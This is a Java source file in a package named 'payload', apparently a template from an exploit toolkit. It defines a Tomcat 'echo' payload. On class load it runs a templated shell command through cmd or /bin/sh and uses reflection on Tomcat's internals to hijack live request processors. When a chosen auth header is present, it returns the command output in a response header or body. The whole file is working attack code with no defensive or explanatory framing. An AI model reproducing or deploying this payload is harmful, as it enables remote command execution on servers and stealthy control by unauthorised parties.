package payload;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Scanner;

public class TomcatEcho {
    static String action = "{{action}}";
    static String position = "{{position}}";
    static String cmd = "{{cmd}}";
    static String headerAuKey = "{{header-au-key}}";
    static String headerAuVal = "{{header-au-val}}";
    static String headerKey = "{{header}}";

    public TomcatEcho() {
    }

    private static synchronized <E> void start() {
        try {
            Method m = Thread.class.getDeclaredMethod("getThreads");
            m.setAccessible(true);
            Thread[] ts = (Thread[])((Thread[])m.invoke((Object)null));

            label84:
            for(int i = 0; i < ts.length; ++i) {
                if (ts[i].getName().contains("http") && ts[i].getName().contains("Acceptor")) {
                    Field tf = ts[i].getClass().getDeclaredField("target");
                    tf.setAccessible(true);
                    Object eo = tf.get(ts[i]);

                    try {
                        tf = eo.getClass().getDeclaredField("endpoint");
                    } catch (NoSuchFieldException var14) {
                        tf = eo.getClass().getDeclaredField("this$0");
                    }

                    tf.setAccessible(true);
                    eo = tf.get(eo);

                    try {
                        tf = eo.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException var13) {
                        try {
                            tf = eo.getClass().getSuperclass().getDeclaredField("handler");
                        } catch (NoSuchFieldException var12) {
                            tf = eo.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                        }
                    }

                    tf.setAccessible(true);
                    eo = tf.get(eo);

                    try {
                        tf = eo.getClass().getDeclaredField("global");
                    } catch (NoSuchFieldException var11) {
                        tf = eo.getClass().getSuperclass().getDeclaredField("global");
                    }

                    tf.setAccessible(true);
                    eo = tf.get(eo);
                    if (eo.getClass().getName().contains("org.apache.coyote.RequestGroupInfo")) {
                        tf = eo.getClass().getDeclaredField("processors");
                        tf.setAccessible(true);
                        ArrayList<E> pss = (ArrayList)tf.get(eo);

                        for(int ii = 0; ii < pss.size(); ++ii) {
                            tf = pss.get(ii).getClass().getDeclaredField("req");
                            tf.setAccessible(true);
                            eo = tf.get(pss.get(ii)).getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(tf.get(pss.get(ii)), 1);
                            Object rsp = eo.getClass().getDeclaredMethod("getResponse").invoke(eo);
                            String flag = (String)eo.getClass().getDeclaredMethod("getHeader", String.class).invoke(eo, headerAuKey);
                            if (flag.equals(headerAuVal)) {
                                switch (position) {
                                    case "header":
                                        rsp.getClass().getDeclaredMethod("addHeader", String.class, String.class).invoke(rsp, headerKey, cmd);
                                        continue label84;
                                    case "body":
                                        rsp.getClass().getDeclaredMethod("doWrite", ByteBuffer.class).invoke(rsp, ByteBuffer.wrap(cmd.getBytes()));
                                    default:
                                        continue label84;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Throwable var15) {
        }

    }

    static {
        start();

        try {
            switch (action) {
                case "exec":
                    if (!cmd.isEmpty()) {
                        String[] var11 = new String[3];
                        if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                            var11[0] = "cmd";
                            var11[1] = "/c";
                        } else {
                            var11[0] = "/bin/sh";
                            var11[1] = "-c";
                        }

                        var11[2] = cmd;
                        cmd = (new Scanner(Runtime.getRuntime().exec(var11).getInputStream())).useDelimiter("\\A").next();
                    }
            }
        } catch (Exception var3) {
        }

        start();
    }
}
